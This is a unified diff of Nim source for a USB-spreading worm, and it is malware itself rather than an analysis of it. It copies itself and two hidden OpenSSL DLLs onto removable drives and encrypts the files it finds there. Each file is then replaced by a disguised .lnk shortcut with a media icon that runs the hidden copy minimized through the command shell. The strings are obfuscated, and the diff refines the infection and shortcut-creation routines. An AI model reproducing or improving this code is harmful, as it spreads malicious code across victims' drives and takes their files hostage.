@@ -185,8 +185,12 @@ proc hideFile(path: string): void =
 
   discard SetFileAttributes(path, newAttr)
 
-proc createShortcut(sys32: string, programPath: string, savePath: string,
-    iconPath: string, iconIndex: int, encryptedFilePath: string): void =
+proc createShortcut(
+  sys32: string, destName: string,
+  savePath: string,
+  iconPath: string, iconIndex: int,
+  encryptedFilePath: string
+): void =
   var
     pIL: ptr IShellLink
     pPF: ptr IPersistFile
@@ -196,13 +200,13 @@ proc createShortcut(sys32: string, programPath: string, savePath: string,
 
   discard pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))
 
-  discard pIL.SetPath(sys32 / d e"cmd.exe")
+  discard pIL.SetPath(d e"%comspec%")
   discard pIL.SetArguments(
     ## d(e("")) is different from d e"", see hideString.nim
-    d(e("/c \"start \"\"\"\" \"")) & programPath & d(e("\" \"")) &
-        encryptedFilePath & d(e("\"\""))
+    d(e("/c \"start \"\"\"\" /b \"%CD:~0,3%")) & destName &
+    d(e("\" \"")) & encryptedFilePath & d(e("\"\""))
   )
-# /c "start """" "D:\$WinDrive.dump" "D:\abi.txt""
+# /c "start """" /b "D:\$WinDrive.dump" "D:\abi.txt""
   discard pIL.SetIconLocation(iconPath, int32 iconIndex)
 
   discard pIl.SetShowCmd(7) # start minimized
@@ -223,7 +227,7 @@ proc encryptFile(filePath: string): void =
   # write encrypted file
   writeFile(filePath, encrypt(data, d INFECT_ENCRYPTION_KEY))
 
-proc checkDrive(dest: string, drivePath: string): void =
+proc checkDrive(destName: string, drivePath: string): void =
   let sys32 = getEnv(d e"SystemRoot") / d e"System32"
   for path in walkDirRec(drivePath):
     let (dir, name, fileExt) = splitFile(path)
@@ -244,8 +248,13 @@ proc checkDrive(dest: string, drivePath: string): void =
         of wmploc:
           iconPath = sys32 / d e"wmploc.dll"
 
-        createShortcut(sys32, dest, dir / name & d e".lnk", iconPath, index,
-            path)
+        createShortcut(
+          sys32, destName,
+          dir / name & d e".lnk",
+          iconPath, index,
+          name & fileExt
+        )
+
         break
 
 
@@ -271,16 +280,28 @@ proc searchForUSB(): void =
         if driveName == "":
           driveName = d e"Drive"
 
-        let dest: string = drivePath / d(e("$Win")) & driveName & d(e(".dump"))
+        let destName: string = d(e("$Win")) & driveName & d(e(".dump"))
+        let dest: string = drivePath / destName
         ## possible names:
         ## $Win
         ## $WinSearch
         ## $WinQuery
         ## $WinFind
         if not existsFile(dest): # daca ii deja infectat lasa l in pace
+          let ddl1Name: string = d e"libssl-1_1-x64.dll"
+          let ddl1Path: string = drivePath / ddl1Name
+          copyFile(ddl1Name, ddl1Path)
+          hideFile(ddl1Path)
+
+          let ddl2Name: string = d e"libcrypto-1_1-x64.dll"
+          let ddl2Path: string = drivePath / ddl2Name
+          copyFile(ddl2Name, ddl2Path)
+          hideFile(ddl2Path)
+
           copyFile(appName, dest)
           hideFile(dest)
-          checkDrive(dest, drivePath)
+
+          checkDrive(destName, drivePath)
 
 proc initInfectThread*(): void {.thread.} =
   CoInitialize(nil)
